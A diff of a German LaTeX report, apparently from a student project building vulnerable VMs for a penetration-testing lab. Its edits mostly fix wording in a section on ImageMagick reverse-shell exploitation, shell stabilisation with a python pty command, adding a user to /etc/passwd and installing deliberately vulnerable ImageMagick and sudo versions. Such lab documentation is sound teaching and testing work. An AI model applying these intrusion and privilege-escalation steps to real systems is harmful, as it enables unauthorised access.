+    vorkonfiguriert, kam jedoch trotzdem mit jeder Menge Problemen und Konfigurationsaufwand.
+    Das Problem des nicht laufenden SSH Services wurde dann über den sudo crontab der \ac{vm} gelöst, welcher den SSH Service startet.
     Der crontab kann den Container über den Befehl \textit{docker exec} auf den Container zugreifen, dabei muss man jedoch beachten, dass die Flags \textit{-it} nicht gesetzt sind, da sonst eine interaktive Shell gestartet wird.
-    Danach muss nur doch die Portweiterleitung eingerichtet werden, was jedoch ein gewisses Verständnis benötigt. Dadurch kann jetzt extern über SSH auf den Ilias Docker Container zugegriffen werden.
+    Danach muss nur doch die Portweiterleitung eingerichtet werden, was jedoch ein gewisses Verständnis benötigt.
+    Dadurch kann jetzt extern über SSH auf den Ilias Docker Container zugegriffen werden.
 
     \subsubsection{Selenium}
     \label{subsubsec:lessonslearnedSelenium}
@@ -956,7 +969,7 @@
     \newpage
     \subsection{Virtuelle Maschine 2}
     \label{subsec:vm2LessonsLearned}
-    Ein Großteil der beschriebenen Lessons Learned, welche die \ac{vm}s oder Docker betreffen sind aufgrund des relativ gleichen Aufbaus der Maschinen auch auf die \ac{vm}2 anzuwenden.
+    Ein Großteil der beschriebenen Lessons Learned, welche die \ac{vm}s oder Docker betreffen, sind aufgrund des relativ gleichen Aufbaus der Maschinen auch auf die \ac{vm}2 anzuwenden.
 
     \subsubsection{ImageMagick Exploit und anschließendes stabilisieren einer Reverse Shell}
     \label{subsubsec:lessonslearnedShell}
@@ -965,19 +978,19 @@
     Einen fertigen ImageMagick Exploit mit einer Netcat Reverse Shell ist so nicht direkt zu finden.
     Stattdessen gilt es wie in~\ref{subsubsec:imageMagickFinden} ausführlich beschrieben, den bereits auf \href{https://www.exploit-db.com/exploits/39767}{\textbf{exploit-db}} vorhandenen Exploit um eine Netacat Reverse Shell zu erweitern.
     Mittels des fertigen Expoits lässt sich die ImageMagick Schwachstelle ausnutzen, doch die dadurch zustande kommende Reverse Shell ist zu instabil um weiterzuarbeiten.
-    Eine große Herausforderung bestand daher darin, die Shell so zu stabilisieren, das es möglich war mit einem vollständig funktionstüchtigem Terminal weiterzuarbeiten.
+    Eine große Herausforderung bestand daher darin, die Shell so zu stabilisieren, dass es möglich war, mit einem vollständig funktionstüchtigem Terminal weiterzuarbeiten.
     Denn zuvor war es nicht möglich den installierten Editor nano, die Pfeiltasten zu nutzen oder längere Befehle zu schreiben.
     Wie in Abschnitt ~\ref{subsubsec:verbindungHerstellen} beschrieben ist die Shell nach Anwenden des \textit{python -c 'import pty; pty.spawn("/bin/bash")'} Befehls dahingehen stabilisiert, dass man als www-data Nutzer die meisten grunsätzlichen Dinge nutzen kann.
     Verwendet man aber nicht den echo Befehl, um einen zusätzlichen Nutzer in die /etc/passwd Datei einzupflegen, muss man auf die Pfeiltasten und einen Texteditor zurückgreifen.
     Dies ist aber immer noch nicht möglich, dazu sind zusätzlich die nächsten drei beschrieben Schritte notwendig.
-    Das Internet bietet einige Anleitungen eine einfache Reverse Shell zu einem komplett funktionstüchtigen Terminal auszubauen.
-    Nach langem Suchen und vielen fehlgeschlagenen Versuchen, brachte der Lösungsansatz von~\textcite{shellStabilisieren} den erhofften erfolg.
-    Durch Ausführen der von ihm angegeben Schritte, entsteht ein komplett funktionstüchtiges Terminal in dem auch nano und die Pfeiltasten genutzt werden können.
+    Das Internet bietet einige Anleitungen, eine einfache Reverse Shell zu einem komplett funktionstüchtigen Terminal auszubauen.
+    Nach langem Suchen und vielen fehlgeschlagenen Versuchen, brachte der Lösungsansatz von~\textcite{shellStabilisieren} den erhofften Erfolg.
+    Durch Ausführen der von ihm angegeben Schritte, entsteht ein komplett funktionstüchtiges Terminal, in dem auch nano und die Pfeiltasten genutzt werden können.
 
 
     \subsubsection{ImageMagick Pfad}
     \label{subsubsec:lessonslearnedPath}
-    Zu begin wurde ImageMagick erfolgreich installiert, ILIAS konnte die Funktion \textit{convert} jedoch nicht finden und somit konnten keine Profilbilder hochgeladen werden.
+    Zu Beginn wurde ImageMagick erfolgreich installiert, ILIAS konnte die Funktion \textit{convert} jedoch nicht finden und somit konnten keine Profilbilder hochgeladen werden.
     Nach Auswerten der Error-Logs konnte festgestellt werden, dass der Pfad in der docker-ilias-entrypoint Datei falsch hinterlegt war.
     Der Pfad musste demnach wie folgt korrigiert werden:
     \\
@@ -998,7 +1011,7 @@
     Das bedeutet, die Programme können nicht über \textit{apt-get updated \&\& apt-get install sudo/imagemagick} heruntergeladen werden.
     Daher galt es, alternative Quellen für die anfälligen Versionen zu finden.
     Für \href{https://launchpad.net/imagemagick/main/6.9.3-8/+download/ImageMagick-6.9.3-8.tar.gz}{ImageMagick}\footnote{Zum Download von ImageMagick Version 6.9.3-8 bitte klicken.} gibt es mit Launchpad eine alternative Quelle und für die anfällige \href{https://www.sudo.ws/dist/sudo-1.8.27.tar.gz}{sudo Version}\footnote{Zum Download von Sudo Version 1.8.27 bitte klicken.} mit der sudo.wz Webseite.
-    Zum Downloaden und Einrichten von ImageMagick ist das base dockerfile um folgenden Code zu ergänzen, Hilfe bietet dabei die Anleitung von~\textcite{imageMagickEinrichten}:
+    Zum Downloaden und Einrichten von ImageMagick ist das base dockerfile, um folgenden Code zu ergänzen, Hilfe bietet dabei die Anleitung von~\textcite{imageMagickEinrichten}:
     \vspace{0.1cm}
     \begin{lstlisting}[label={lst:imageMagickDownload}]
         RUN wget https://launchpad.net/imagemagick/main/6.9.3-8/+download/
